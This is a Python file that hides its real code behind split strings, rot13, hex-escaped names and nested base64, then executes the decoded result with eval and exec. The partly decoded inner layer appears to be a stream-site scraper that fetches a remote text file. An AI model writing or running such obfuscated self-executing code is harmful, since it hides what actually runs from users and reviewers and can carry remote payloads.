
import base64, codecs
thecrew = 'DQppbXBvcnQgYmFzZTY0LCBjb2RlY3MNCnRoZWNyZXcgPSAnRFFwcGJYQnZjblFnWW1GelpUWTBMQ0JqYjJSbFkzTU5DblJvWldOeVpYY2dQU0FuWVZjeGQySXpTakJKU0Vwc1kxaFdiR016VW5wRVVYQndZbGhDZG1OdVVXZGpiVlZPUTIxYWVXSXlNR2RaYmswd1NVZHNkR05IT1hsa1EwSkRXbGRHTVdSSGJHMWtWM2hVWWpOV2QwUlJjSEJpV0VKMlkyNVJaMWx0Um5wYVZGa3dSRkZ2VGtOdFJtNWFWelV3U1VRd1owb3dNWFpsYld4ellrZEZkazVUTkhkSlEyaFlZVmMxYTJJelpIcEpSVFZWU1VSWmRVMVVjMmRXTW14MVRtcFJOMGxJWnpKT1EydG5VVmhDZDJKSFZsaGFWMHBNWVZoUmRrNVVUVE5NYWsweVNVTm9URk5HVWs1VVEzZG5Za2RzY2xwVFFraGFWMDV5WW5scloxRXlhSGxpTWpGc1RIcGpNa3hxUVhWTmVtZDNUMU0wZUUxNlNXZFZNa1p0V1ZoS2NFeDZWWHBPZVRSNlRtbGpUa051Vm1aaVIyeDFZWGxCT1VsRFpHOWtTRkozVDJrNGRtTllWbWhsVnpWc1pFTTFNV041T1dwWldGSnNXakk1ZVdWVE9YVmhSM2QwWXpOU2VWcFhSblJqZVRodVJGRndkV0ZIZUZWaU1uUnNZbWxCT1VsSVNteGpXRlpzWXpOU2VreHRaR3hrUTJkdVlVaFNNR05JVFRaTWVUbHBZVmhTYVdSWFRuSmFXRkYxWWpOS2Jrd3pVbTlqYlZZelRETlNiR1ZJVW0xaFYzaHNZM2s1ZVZsWVkzWmlWMFo2WkVkV2VVd3lOVzlpUXpVd1pVaFJia3RUTldwaU1qVXdXbGMxTUVSUmNIVmhSM2htV1ZoV0p3MEtaRzlsYzI1MElEMGdKekJ1VUU0NVZsQlhPRVF5T1dsdU1ubDVRMGhUTVhGVWRXbHdlbmsyVEV0RlkyOHlORGxXZGs1bFZsUTFZbTlUUldsdU1rbG9VVVJqWVV4S01YbExNbXRqY0RORWRFTkdUMjlMUkRCWVVVUmlRVkInDQpkb2VzbnQgPSAnNkVLeUFxeDl1R0hnU3AwMGxIMnFBRjFjdkpScXZESU8yR2FFSkhSOXZwSURrTXlNRVpVRWpyeHllcEhjV29LU0lKenVBWnh4akpTSVdwMjlIck'
doesnt = 'c1nT9HLmOirHIKpHtkFRMXn2ciE1VmFJ1OI29VZIyWraSnEzSGAJ8lH1WZFSplEmAWDIc4rJWjFHudGQS5AxEXrJyZFRx1omWGHxEWGmWULHIXFSV5M29gDIqhrH1SJyISHaW4rGSjFTqGGQNkqHMXGIMnq3uepSACZHkuH0unFx1AFSV1qJ95FIAAZwyRDHcwJxLkpJqUFTqXGRy1HycGqHcVHwHjFKySI1c4ZIuOE09XFRqCZUOEIwInF09RDHgwnRM3FGEToIqUGKb5EUSHH2uVFH11FxySE1cIH0yWZwSEEwWAqHqEI2IkF05gFacGHUS5pJEioHSCJyA5JHIXDJgWITp1FKcFnxjkH1WZLHIXFSV1ZRqYLwIiH01VpRgWnHM4qGOirTVjpIVkJHqYrJyZFRDlFRuSqaSGGHEULHIXFSV1ZRy5FIAZZ1AVowA5FxuUGmOUE1qUGGNkIRSYFH1ZFRx1pUyWHz5FZIuOF3ScJauWAHcGG2gkF05fERcOnRIuG3cWoIp1GRb5AxWXn0SSLH93FRuSqaSGGHEULHIXFSV1ZRy5EJIZZwx2GJSSHHI2pRSDrxIcIyRjqSpjI2uXFKOeo1WeM0I6I1unraH1FaykGJ95qHInHzqKEQOGLHMVDH9AZUyEEUb1GHygH2MXHIp0pSEnoHuYFH1XHypmFayjZJ4jM1MjZwI4EGWdnxk4pHyirQybFTSCrRHmqJMUHxS4pQWGF0SYI1ulLH9gGRyjZKO6GHqhZQIEoxuGLHMVDIOlFJAZFUqGq29UEJSXq1qHpIAwFxWYDKIXHwEdEIAGnHq4DJuUq093o0yALxk5DH9PFUyHpIESHxuYG2IXrKSAGGSvoRy3G0knZQEdGQVkFz5HI0qhIHS1FJ1WoRLkEJyUrRSwERckI0DjI2yAHaOepQO5HycHpKqiFH00GIAkFaW6EIMUF0yhJaxaQDcxolN9VPqMq1ZjMQEwE0c0LmABnSVkJz9Kn2EKMIqBAx1HMRgAZIb2I2kbFzEToSunE3ucLzkTqIDlZHqvoUOLGyEPoIHlqQSKIRx1MSqFFSMhIzgEIRWZH1IBDybjoRyHoyceI0IToyITGxAEZKOLHzcTn1VlrUEnEzD0IxqWryMhMRkFZzq3JJkxZ2Zjo3yuERWcIwAxZIxjMRqyI015Iz5fF2IKqR9EZzkPJwOfESSgpTyAnyI3I2kwZH1SoRIAE2EdGGSXAIZjnR9xoIWMHIuJ'
do = 'alNFcHNaRWhTY0ZwdWEzQkVVVzluU1VOQloxcFhOV3BqYm14M1pFTkJPVWxJU214TWJVNTJZbGhDY0dKSFZXOUpiVVl3WWpKS1kwdEROSEpRTVhkd1NXbDRlVnBUTlVWVU1WSkNWRVYzY0V4dFduQmliVkpvWWtkM2Ixa3lPWFZrUjFaMVpFTnJUa05wUVdkSlEwSndXaWNOQ21SeVlXMWhJRDBnSjNaUGVXOTZRV3h5UzA4d1FuUXdXRlpRVG5SV1VFNTBWbEJQZVc5NlFXeHlTMDh3VmxFd2RFMUtOWGR3WVhscWNWTm1ha3RFTUZoV1VFNTBWbEJPZEZaUVQzbHZla0ZzY2t0UE1GWlJNSFJOU2pWM2NHRjVhbkZRTld4TlMwOW1URXBCZVZoUVYzVnhWRGwyV0ZCV1psWjJWbU5aWVZkNWNGUnJkVXd5U0dKV2RuQmpWblpxZGxaMmVFRlFkazUwVmxCT2RGWlFUblJOVkVsM2NHRjVhbkZRVGpsV1ZGZDFjREpJTWtGUU5YWkJkMFY0VFVwQmFVMVVTR0pOU2pWM2NHRjVhbkZRZUVGUWRrNTBWbEJPZEZaUVRuUndNMFZzVFVwVFoxbDZVMnB3VkVsb1RWQjFOMWN6UldOeFZHdDVWMjFpZEZjeFoxRkhNR3REU0haUGFYQjZRV0p1U2tWeFdIbG1hVVF3T1ZwSE1WZHhWbE5uVUV0SloxRkhNR3REU0haUE0yNVVlVEJOU1RGRWIxUlROVlpUUVRCd2VrbDFiMGxtYVVRd09WcEhNVmR4UycNCmRyYW1hID0gJ3pqNUhSZ1RHMjlSWlF5bkVtU0pxVDhtSTNxaElVeTRGME13bzF4akRIQVVId3lURjBNak15TURwSjFrSUlxNUdSYmpMSFcyRzN1QUZ4U2ZweGdDWlNNRE1hRWlyYUl6Rm1XR1pLU0hxR3lMRVFPTEl5T0JxU01IRkpNalp4dDJISEV2cVNNREdhRUpIUjUwSXlJQ3FLTm1KeFNEcVFPTEl5T0JxU01JSTN5a0lIeWZvM01Db0tTSUkzeVpGd09PSFVEOUNGcEFQYVd5cDNPeUwzRHRDRk5hS1V0M1p5azRBek1wclFwMEtVdG1aSWs0Wm1aYVFEYzFwMlNoTVV5aXFGTjlWVEkyTEpqYlcxazRBbUVwclFMNEtVdDJBSWs0QXdBcHJRcGxLVXQyQUlrNEFtcGFYRk5lVlRJMkxKamJXMWs0QX'
drama = 'qOpUWEGKcYIKDlDIAeARS3FKOlHHkgF1I0Z1bknmEnrxyjpySZZRgIqQWOFJf0DKqOpUWEGKcYIKDlDIAeARS3FKOlHIL0F1I0ZxSGnmEOrx1jpySZZHgIqQAnZJf0DKcWpUWEpQOYIKEfGQSeASc3G3OlHKOfF1I0ZxSWnmEOoHSjpySjnxgIqQWOFJf0DKqOpUWEpQOYIKEfDxMjL1MDMaEAF011o1O0LHgIqQWOH2f0DKcZLIuTGzIJIRxlGRcdLypknmEOq0SjpySArxgIqQWOH2f0DKqWpUWEGT1YIKDmJwSeASc6FKOlHHjjF1I0ZxSWnmEOq0SjpySArxgIqQWOH2f0DKqWpUWEIwEYIKDlDIAeARSgI3OlHHkeF1I0Zx1GnmEOq1AjpySKq0gIqTknH2f0DJ1KpUWEGQSYIKDmJwSeARSgG3OlHHjkF1I0ZybknmEOoHIjpySJAIqfrRSDrxxlGRcdLxjlBJqjIUyzGHM1qxkYDKyOq0EbGUqZZR1HFKqiZxI5JSEWZxkXnzWKZJf0DJ1WpUWEpT1YIKDlJxyeARS6FKOlHHjjF1I0Z0WWnmEOrx1jpySjZIqfrTAMHUN4pQASoT5XAJSQqaOzImWWAR1XJzSLEat9Wj0XpzImpTIwqPN9VPqprQplKUt2Myk4AmEprQZkKUtmZlpAPaImLJ5xrJ91VQ0tMKMuoPtaKUt3ASk4AwuprQL1KUt2Z1k4AmWprQL1KUt3AlpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt2Myk4AwIprQpmKUt2MIk4AmEprQWwKUtlZSk4AmWprQL1KUt3Z1k4AmOprQL1KUt2Z1k4AmEprQV5WlxtXlOyqzSfXPqprQL0KUt2MvpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt3Zyk4AwSprQMxKUt2ZIk4ZzAprQVjKUt3Zyk4AwIprQpmKUt3ZSk4AwIprQLmKUt3ASk4ZwxaXD0XMKMuoPuwo21jnJkyXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt3AIk4AmAprQLkKUt2MIk4AwEprQp5KUt2Myk4AmHaXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
respect = '\x72\x6f\x74\x31\x33'
usandyou = eval('\x74\x68\x65\x63\x72\x65\x77') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x6f\x65\x73\x6e\x74\x2c\x20\x72\x65\x73\x70\x65\x63\x74\x29') + eval('\x64\x6f') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x72\x61\x6d\x61\x2c\x20\x72\x65\x73\x70\x65\x63\x74\x29')
eval(compile(base64.b64decode(eval('\x75\x73\x61\x6e\x64\x79\x6f\x75')),'<string>','exec'))